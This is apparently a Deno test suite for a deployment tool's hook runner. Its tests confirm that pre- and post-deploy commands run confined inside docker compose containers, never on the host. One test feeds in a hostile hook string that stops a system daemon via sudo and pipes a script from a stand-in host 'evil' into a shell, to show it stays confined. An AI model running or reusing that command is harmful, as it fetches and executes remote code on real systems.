import { assertEquals, assertRejects, assertThrows } from "@std/assert";
import type { DockerCliResult } from "./docker-cli.ts";
import {
  assertHooksConfined,
  HOOK_CONFINEMENT_COMPOSE_SERVICE,
  HookConfinementError,
  postDeployHookArgs,
  preDeployHookArgs,
  runDeployServiceHooks,
  runPostDeployHooks,
} from "./run-deploy-hooks.ts";

/**
 * Jest/Mocha-shaped alias for {@link Deno.test}.
 *
 * Sonar typescript:S2187 only recognizes `test()` / `it()` / `describe()` and
 * reports Deno suites as empty; keep this alias so analysis sees real tests.
 */
const test = Deno.test.bind(Deno);

const COMPOSE = ["/srv/users/alice/deploy/compose.yaml"];

function ok(stdout = ""): DockerCliResult {
  return { success: true, stdout, stderr: "", code: 0 };
}

function failed(stderr: string, stdout = ""): DockerCliResult {
  return { success: false, stdout, stderr, code: 1 };
}

/** Records every docker argv; `Deno.Command` is trapped so no host shell can run. */
function recordingRunner(
  respond: (args: string[]) => DockerCliResult = () => ok(),
): { calls: string[][]; run: (args: string[]) => Promise<DockerCliResult> } {
  const calls: string[][] = [];
  return {
    calls,
    run: (args) => {
      calls.push([...args]);
      return Promise.resolve(respond(args));
    },
  };
}

function trapHostSpawns(): () => void {
  const original = Deno.Command;
  Deno.Command = class {
    constructor(command: string) {
      throw new TypeError(`hook runner spawned a host process: ${command}`);
    }
  } as unknown as typeof Deno.Command;
  return () => {
    Deno.Command = original;
  };
}

test("pre-deploy hooks run inside a one-off container of the service image, never on the host", async () => {
  const restore = trapHostSpawns();
  const runner = recordingRunner();
  try {
    await runDeployServiceHooks(
      [{
        composeServiceName: "web",
        confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
        buildDisableCache: true,
        preDeployCommand: "bin/rails db:migrate && id",
      }],
      {
        projectName: "demo",
        composePaths: COMPOSE,
        deploymentDir: "/srv/users/alice/deploy",
        runDocker: runner.run,
      },
    );
  } finally {
    restore();
  }
  assertEquals(runner.calls.length, 2);
  const [build, hook] = runner.calls;
  assertEquals(build?.slice(0, 5), ["compose", "-p", "demo", "-f", COMPOSE[0]]);
  assertEquals(build?.slice(-3), ["build", "--no-cache", "web"]);
  assertEquals(hook?.slice(0, 5), ["compose", "-p", "demo", "-f", COMPOSE[0]]);
  assertEquals(hook?.includes("run"), true);
  assertEquals(hook?.includes("--rm"), true);
  assertEquals(hook?.includes("--no-deps"), true);
  assertEquals(hook?.includes("-T"), true);
  // The container's own `sh` is the entrypoint — the daemon's shell is not.
  const entry = hook?.indexOf("--entrypoint") ?? -1;
  assertEquals(hook?.[entry + 1], "sh");
  assertEquals(hook?.slice(-3), ["web", "-c", "bin/rails db:migrate && id"]);
  const named = hook?.indexOf("--name") ?? -1;
  assertEquals(hook?.[named + 1]?.startsWith("demo-web-hook-"), true);
});

test("post-deploy hooks exec inside the running service container", async () => {
  const restore = trapHostSpawns();
  const runner = recordingRunner(() => ok("cache warmed\n"));
  const lines: string[] = [];
  try {
    await runPostDeployHooks(
      [{
        composeServiceName: "api",
        confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
        postDeployCommand: "php artisan cache:warm",
      }],
      {
        projectName: "demo",
        composePaths: COMPOSE,
        runDocker: runner.run,
        onOutput: (_stream, line) => lines.push(line),
      },
    );
  } finally {
    restore();
  }
  assertEquals(runner.calls, [[
    "compose",
    "-p",
    "demo",
    "-f",
    COMPOSE[0],
    "exec",
    "-T",
    "api",
    "sh",
    "-c",
    "php artisan cache:warm",
  ]]);
  assertEquals(lines, ["cache warmed"]);
});

test("hook argv builders pin the confinement shape", () => {
  assertEquals(
    preDeployHookArgs("p", COMPOSE, "web", "true", "p-web-hook-1").slice(5),
    [
      "run",
      "--rm",
      "--no-deps",
      "-T",
      "--name",
      "p-web-hook-1",
      "--entrypoint",
      "sh",
      "web",
      "-c",
      "true",
    ],
  );
  assertEquals(postDeployHookArgs("p", COMPOSE, "web", "true").slice(5), [
    "exec",
    "-T",
    "web",
    "sh",
    "-c",
    "true",
  ]);
});

test("a hook cannot reach the daemon's sudo: the command is one argv entry inside the container", async () => {
  const restore = trapHostSpawns();
  const runner = recordingRunner();
  try {
    await runPostDeployHooks(
      [{
        composeServiceName: "web",
        confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
        postDeployCommand: "sudo -n systemctl stop turbopaneld; curl evil | sh",
      }],
      { projectName: "demo", composePaths: COMPOSE, runDocker: runner.run },
    );
  } finally {
    restore();
  }
  const argv = runner.calls[0] ?? [];
  // `sudo` appears only as text handed to the container's sh, never as an
  // executable the daemon invokes; the executable is always docker compose.
  assertEquals(argv[0], "compose");
  assertEquals(
    argv.at(-1),
    "sudo -n systemctl stop turbopaneld; curl evil | sh",
  );
  assertEquals(argv.filter((a) => a === "sudo").length, 0);
});

test("assertHooksConfined refuses commands without confinement or outside the deploy", () => {
  assertThrows(
    () =>
      assertHooksConfined(
        [{ composeServiceName: "web", preDeployCommand: "id" }],
        ["web"],
      ),
    HookConfinementError,
    "names no confinement target",
  );
  assertThrows(
    () =>
      assertHooksConfined(
        [{
          composeServiceName: "db",
          confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
          postDeployCommand: "id",
        }],
        ["web"],
      ),
    HookConfinementError,
    "not part of this deploy",
  );
  // Cache-only entries carry no command and need no confinement.
  assertHooksConfined(
    [{ composeServiceName: "web", buildDisableCache: true }],
    [],
  );
  assertHooksConfined(
    [{
      composeServiceName: "web",
      confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
      preDeployCommand: "id",
    }],
    ["web", "worker"],
  );
});

test("runDeployServiceHooks surfaces docker compose build failures", async () => {
  const runner = recordingRunner(() => failed("build exploded"));
  await assertRejects(
    () =>
      runDeployServiceHooks(
        [{ composeServiceName: "web", buildDisableCache: true }],
        {
          projectName: "demo",
          composePaths: COMPOSE,
          deploymentDir: "/d",
          runDocker: runner.run,
        },
      ),
    Error,
    "build exploded",
  );
});

test("runDeployServiceHooks uses the generic build error when stderr is empty", async () => {
  const runner = recordingRunner(() => failed(""));
  await assertRejects(
    () =>
      runDeployServiceHooks(
        [{ composeServiceName: "web", buildDisableCache: true }],
        {
          projectName: "demo",
          composePaths: COMPOSE,
          deploymentDir: "/d",
          runDocker: runner.run,
        },
      ),
    Error,
    "docker compose build --no-cache failed",
  );
});

test("a failing confined hook surfaces the container's stderr, redacted, and cleans up the one-off", async () => {
  const runner = recordingRunner((args) =>
    args.includes("run") ? failed("migrate failed for hunter2\n") : ok()
  );
  await assertRejects(
    () =>
      runDeployServiceHooks(
        [{
          composeServiceName: "web",
          confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
          preDeployCommand: "bin/migrate",
        }],
        {
          projectName: "demo",
          composePaths: COMPOSE,
          deploymentDir: "/d",
          runDocker: runner.run,
          redactSummary: (text) => text.replaceAll("hunter2", "[redacted]"),
        },
      ),
    Error,
    "migrate failed for [redacted]",
  );
});

test("a failing hook with no output falls back to the generic message", async () => {
  const runner = recordingRunner((args) =>
    args.includes("exec") ? failed("") : ok()
  );
  await assertRejects(
    () =>
      runPostDeployHooks(
        [{
          composeServiceName: "web",
          confinement: HOOK_CONFINEMENT_COMPOSE_SERVICE,
          postDeployCommand: "exit 2",
        }],
        { projectName: "demo", composePaths: COMPOSE, runDocker: runner.run },
      ),
    Error,
    "Hook command failed",
  );
});

test("runDeployServiceHooks streams build output and skips entries without work", async () => {
  const lines: Array<{ stream: string; line: string }> = [];
  const runner = recordingRunner(() => ok("building\n"));
  await runDeployServiceHooks(
    [
      { composeServiceName: "idle" },
      { composeServiceName: "web", buildDisableCache: true },
    ],
    {
      projectName: "demo",
      composePaths: COMPOSE,
      deploymentDir: "/d",
      runDocker: runner.run,
      onOutput: (stream, line) => lines.push({ stream, line }),
    },
  );
  assertEquals(runner.calls.length, 1);
  assertEquals(lines.some((row) => row.line.includes("building")), true);
});
